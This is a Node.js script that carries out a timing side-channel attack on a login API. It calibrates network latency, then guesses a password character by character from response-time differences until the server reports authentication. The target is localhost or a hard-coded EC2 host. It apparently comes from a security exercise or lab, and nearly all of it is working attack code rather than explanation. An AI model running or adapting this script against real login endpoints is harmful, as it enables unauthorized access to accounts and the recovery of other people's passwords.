const fetch = require('node-fetch');
const {exampleCharSet} = require('./charSet.json');

const devEnv = process.env.NODE_ENV === 'develop';
const URL = devEnv ? 'http://localhost:8000/api/login' : 'http://ec2-107-23-202-11.compute-1.amazonaws.com/api/login';
console.log(`NODE_ENV: ${process.env.NODE_ENV}. URL: ${URL}`);

let password = exampleCharSet[0];
let charIndex = 0;
let exampleCharSetPointer = 0;
let sizedMatchedTimes = 0;
let charIndexMatchedTimes = 0;
let establishConnectionRequestTimes = 0;
let latency = 100;

const connectionEstablishmentResponseTimes = [];
const sleepDiffThreshold = 200;
const stableConnectionBestFiveResponseTimeDifferenceThreshold = 500;
const matchedTimesThreshold = 10;
const establishConnectionRequestThreshold = 10;
const exampleCharSetLength = exampleCharSet.length - 1;

const getNextFromExampleCharSet = () => exampleCharSet[exampleCharSetPointer++];
const isLastCharInExampleCharSet = () => exampleCharSetLength === exampleCharSetPointer;
const sleep = async (ms) => {
    return await new Promise(resolve => setTimeout(resolve, ms));
};
const generateRandomInteger = (min, max) => {
    return ~~(min + Math.random() * (max + 1 - min))
};
const bruteForce = () => {
    if (isLastCharInExampleCharSet()) {
        console.warn('__Last char in Example charset reached. Reset exampleCharSetPointer and move back one charIndex__');
        exampleCharSetPointer = 0;
        --charIndex;
    }
    const newPassword = password.substr(0, charIndex) + getNextFromExampleCharSet() + password.substr(charIndex + 1);
    console.log(`newPassword: ${newPassword}`);
    password = newPassword;
};
const generatePassword = () => {
    if (sizedMatchedTimes === matchedTimesThreshold) {
        if (charIndexMatchedTimes === 0) {
            bruteForce(password);
        }
    } else if (sizedMatchedTimes === 0) {
        password += exampleCharSet[0];
    }
};
const calculateSizeMatched = (diff) => diff > latency + sleepDiffThreshold;
// const calculateSizeMatched = (diff) => diff > sleepDiffThreshold;

const reset = () => {
    password = exampleCharSet[0];
    charIndex = 0;
    exampleCharSetPointer = 0;
    sizedMatchedTimes = 0;
    charIndexMatchedTimes = 0;
};

const calculateCharIndexMatched = (diff) => {
    let calcThreshold = latency + (charIndex + 2) * sleepDiffThreshold;
    // let calcThreshold = (charIndex + 2) * sleepDiffThreshold;
    if (diff < sleepDiffThreshold) {
        reset();
    }
    // let calcThreshold = threshold;
    // console.log(`diff: ${diff} ms`);
    // console.log(`calcThreshold: ${calcThreshold} ms`);
    return diff > calcThreshold;
};

async function establishStableConnection() {
    const startTime = process.hrtime();
    await fetch(URL, getFetchOptions());
    connectionEstablishmentResponseTimes.push(getDiff(startTime));

    if (establishConnectionRequestTimes++ < establishConnectionRequestThreshold) {
        return await establishStableConnection();
    }
    connectionEstablishmentResponseTimes.sort((a, b) => a - b);
    let l = connectionEstablishmentResponseTimes.length - 1;
    const establishedConnectResponseTimeDifference = connectionEstablishmentResponseTimes[l] - connectionEstablishmentResponseTimes[l - 5];
    if (establishedConnectResponseTimeDifference > stableConnectionBestFiveResponseTimeDifferenceThreshold) {
        console.error(`could not establish a solid, stable connection between the server. From (${establishConnectionRequestThreshold}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}. Shut down, try again later.`);
        process.exit(0);
    }
    console.log(
        `Established stable connection between the server.
        From (${establishConnectionRequestThreshold}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}.
        connectionEstablishmentResponseTimes: ${JSON.stringify(connectionEstablishmentResponseTimes)} ms.
        Starting the timing attack.`);
    latency = connectionEstablishmentResponseTimes[0] / 2;
    await test();
}

const getDiff = (startTime) => {
    const rawDiff = process.hrtime(startTime);
    const mSec = rawDiff[1].toString().substr(0, 3);
    return Number(`${rawDiff[0]}${mSec}`);
};

const getFetchOptions = () => {
    return {
        method: 'post',
        headers: {'content-type': 'application/json'},
        body: JSON.stringify({accountId: 'asdasd', password})
    };
};

async function test() {
    const startTime = process.hrtime();
    const result = await fetch(URL, getFetchOptions());
    const diff = getDiff(startTime);
    const {authenticated} = await result.json();
    if (authenticated) {
        console.warn(`password: ${password}`);
        process.exit(0);
    } else {
        await sleep(100);
        let sizeMatched = calculateSizeMatched(diff);
        if (sizeMatched && sizedMatchedTimes !== matchedTimesThreshold) {
            sizedMatchedTimes++;
        } else if (sizedMatchedTimes === matchedTimesThreshold) {
            let charIndexMatched = calculateCharIndexMatched(diff);
            if (charIndexMatched && charIndexMatchedTimes !== matchedTimesThreshold) {
                // console.log(`charIndexMatched: ${charIndexMatched}`);
                console.log(`charIndexMatchedTimes: ${charIndexMatchedTimes}`);
                charIndexMatchedTimes++;
            } else if (charIndexMatchedTimes === matchedTimesThreshold) {
                charIndex++;
                exampleCharSetPointer = 0;
                charIndexMatchedTimes = 0;
                console.warn(`charIndex Matched ${matchedTimesThreshold} times.`);
                console.log(`charIndex: ${charIndex}`);
            } else {
                charIndexMatchedTimes = 0;
            }
        } else {
            sizedMatchedTimes = 0;
        }
        // if (password.length === 6) {
        // if (password.length === 6) {
        //     console.log(`password: ${password} (length: 6)`);
        // }
        // console.log(`password: ${password}`);
        // console.log(`diff: ${diff}`);
        // }
        // console.log(`diff: ${diff}`);
        // console.log(`sizeMatched: ${sizeMatched} (${sizedMatchedTimes})`);
        await test(generatePassword());
    }
}

establishStableConnection();
